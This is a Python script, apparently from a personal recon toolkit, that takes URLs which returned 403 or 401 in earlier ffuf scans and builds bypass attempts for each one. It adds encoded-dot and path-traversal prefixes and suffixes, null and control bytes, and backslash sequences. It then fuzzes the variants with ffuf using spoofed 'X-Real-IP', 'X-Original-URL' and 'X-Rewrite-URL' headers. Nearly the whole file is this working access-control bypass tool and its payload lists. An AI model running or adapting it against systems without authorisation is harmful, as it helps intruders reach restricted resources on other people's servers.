#!/usr/bin/env python3


import csv
import glob
import os
import argparse
from furl import furl
import itertools
from invoke import run 


input_urls = []
output_urls = []
url_origins = []
url_paths = []


prefix_list = '''/%2e/
/%2e
/../
/..
//
/#/../
/#/..
/dsad;/../
/dsad;/..
/dsad/../
/dsad/..
/..%2f
/..;/
/..;
/..%00
/..%0d
/..%5c
/..\
/..%ff/
/..%ff
/%2e%2e%2f
/%2e%2e%
/.%2e/
/.%2e
/.
/./
/%3f 
/%26
/%23
//test/../%2e%2e%2f<>.JpG?a1="&?z#'''.split('\n')

backfix_list='''/
%3f.gif
/../
//../
..\..\ 
\..\.\..\\
\..\.\..\.\..\.\..\.\..\.\..\.\..\\
\..\.\..\.\..\.\..\.\..\.\..\.\\
\..\.\..\.\..\.\..\.\..\.\\
\..\.\..\.\..\.\..\.\\
\..\.\..\.\..\.\\
\..\.\..\.\.
/..\\
/..%2f
/..;/
/../
/..%00/
/..%0d/
/..%5c
/..\\
/..%ff/
/%2e%2e%2f
/.%2e/
/%3f 
/%26
/%23
.gif
%2egif
../
/../
..\..\ 
..\.\..\\
..\.\..\.\..\.\..\.\..\.\..\.\..\\
..\.\..\.\..\.\..\.\..\.\..\.\\
..\.\..\.\..\.\..\.\..\.\\
..\.\..\.\..\.\..\.\\
..\.\..\.\..\.\\
..\.\..\.\.
..\\
..%2f
..;/
../
..%00/
..%0d/
..%5c
..\\
..%ff/
%2e%2e%2f
.%2e/
%3f
%20
%09
%26
.json
%23'''.split('\n')

midlist = '''//%2e
//.'''.split('\n')

allowed = set('/')

def extract_urls(file):
    global input_urls
    with open(file,'r') as csvfile:
        csvreader = csv.reader(csvfile)
        for row in csvreader:
            if row[4] ==  '403' or row[4] == '401':
                input_urls.append(row[1]) 


def percent_encoding(char):
    a = '%'+ hex(ord(char)).lstrip("0x")
    return a 
    


def add_in_middle_seperately(word,segments):
    new_segments = []
    for index in range(0,len(segments)-1):
        copy = segments.copy()
        if copy[index]:
            copy[index] = copy[index] + word
            new_segments.append(copy)
    if not new_segments:
        # if new_segments = [], return none 
        return None
    return new_segments
    
    


def process_segments(f):
    if set(str(f.path)) <= allowed:
        return 
    # Building urls with url encoding and double encoding first character
  
    # print(f)
    # print(set(str(f.path)))
    f1 = f.copy()
    segments_1 = f1.path.segments
    for item  in range(0,len(segments_1)):
        if segments_1[item] :
            # print(segments_1[item][1:])
            segments_1[item] = percent_encoding(segments_1[item][0])+ segments_1[item][1:]
    url1 = f.origin+str(f1.path)
    url2 = url1.replace('%25','%')
    output_urls.append(url1)
    output_urls.append(url2)

    # Adding /./ /%2e/ in the middle of segments
    f2 = f.copy()
    segments_2 = f2.path.segments

    new_segments_collection = []
    for word in midlist:
        new_segments = add_in_middle_seperately(word,segments_2)
        if new_segments is not None:
            new_segments_collection.append(new_segments)
    if  new_segments_collection:
        # new_segments_collection [[['wp-content//%2e', 'uploads', ''], ['wp-content', 'uploads//%2e', '']], [['wp-content//.', 'uploads', ''], ['wp-content', 'uploads//.', '']]]
        flattened_new_segments_collection = merged = list(itertools.chain.from_iterable(new_segments_collection))
        # print(flattened_new_segments_collection)
        processed_paths = [('/').join(a) for a in  flattened_new_segments_collection]
        for path in processed_paths:
            temp_url = f2.origin + path
            # print(temp_url)
            output_urls.append(temp_url)
        

def process_url(url):
    # Addding prefix and backfix first 
    f = furl(url)
    path = f.path
    origin = f.origin

    new_paths = []
    for string in prefix_list:
        new_paths.append(string+str(path))
    for string in backfix_list:
        new_paths.append(str(path)+string)
    
    for path in new_paths:
        output_urls.append(origin+path)
    # print(new_paths)
    process_segments(f)

        
                
def run_ffuf():
    cmd1 = " ffuf -w {}   -u FUZZ  -H \"X-Real-IP: 127.0.0.1\" -r -mc 200,301,302 -fs 0 -fw 1 -t 100 -s -o {} -of csv".format(output_urlsfile,ffuf_outfile)

    print(cmd1)
    result = run(cmd1, hide=True, warn=True)
    # print(result.stdout.splitlines())
    
    cmd2 =" python3 /root/recon_tools/Scripts/python/ffuf_process.py {}  {}".format(ffuf_outfile,processed_ffuf_outfile)
    print(cmd2)

    run(cmd2, hide=True, warn=True)

    cmd3= "python3 ~/recon_tools/Scripts/python/ffuf_html.py  {}  {}".format(output_dir,html_processed_ffuf_outfile)
    print(cmd3)

    run(cmd3, hide=True, warn=True)

    
    

def split_urls():
    global input_urls
    global url_origins
    global url_paths
    global origins_file
    global paths_file

    for url in input_urls:
        f = furl(url)
      
        url_origins.append(f.origin)
        url_paths.append(f.path)
    with open(origins_file,'w') as w:
        for origin in url_origins:
            w.write(str(origin)+'\n')
    with open(paths_file,'w') as w:
        for path in url_paths:
            w.write(str(path)+'\n')            

def run_ffuf_wheader():
    cmd1 = " ffuf -w {}:ORIGIN  -w {}:PATH -u ORIGINPATH -mode pitchfork -H \"X-Real-IP: 127.0.0.1\"  -H \"X-Original-URL: PATH\" -r -mc 200 -fs 0 -fw 1 -t 100 -s -o {}/originalurl.html -of html".format(origins_file,paths_file,output_dir)

    run(cmd1, hide=True, warn=True)
    

    cmd2 = " ffuf -w {}:ORIGIN  -w {}:PATH -u ORIGINPATH -mode pitchfork -H \"X-Real-IP: 127.0.0.1\"  -H \"X-Rewrite-URL: PATH\" -r -mc 200 -fs 0 -fw 1 -t 100 -s -o {}/rewriteurls.html -of html ".format(origins_file,paths_file,output_dir)

    run(cmd2, hide=True, warn=True)


if __name__ == '__main__':
    my_parser = argparse.ArgumentParser(description='Process 403 entry from ffuf results, prefix /./ in the path, generating new url list to fuzz ')

                    
    my_parser.add_argument('-o',
                    '--output_dir',
                        required = True,
                    help='the location of  ffuf output directory where every file lives ')

    my_parser.add_argument('-i',
                        '--input_dir',
                            required = True,
                        nargs='+',
                        help='the location of direcotry which contains response file from ffuf such as /ffuf/* ')

    args = my_parser.parse_args()

    input_paths = []
    output_dir = os.path.abspath(args.output_dir)

    input_urls_file = "{}/input_urls.txt".format(output_dir)
    output_urlsfile = "{}/output_urls.txt".format(output_dir)
    origins_file = "{}/origins.txt".format(output_dir)
    paths_file = "{}/paths.txt".format(output_dir)
    ffuf_outfile = "{}/ffuf_raw.txt".format(output_dir)
    processed_ffuf_outfile = "{}/processed_ffuf.txt".format(output_dir)
    html_processed_ffuf_outfile = "{}/ffuf_403.html".format(output_dir)
    

    # Put all files in ffuf/* to the input_paths []
    for dir in args.input_dir:
        temp_paths = glob.glob(os.path.abspath(dir))
        input_paths = input_paths + temp_paths

    # Extract urls from all files to input_urls []
    for file in input_paths:
        extract_urls(file)
    


    # split input_urls[] and write to origin_location and path_location
    split_urls()

    #Process input_urls[] and write to output_urls[]
    for url in input_urls:
        process_url(url)

    with open(output_urlsfile,'w') as w:
        for url in output_urls:
            w.write(url+'\n')

    split_urls()

    print("Total {} urls to fuzz for 403 bypass ................".format(len(output_urls)))

    run_ffuf()
    run_ffuf_wheader()
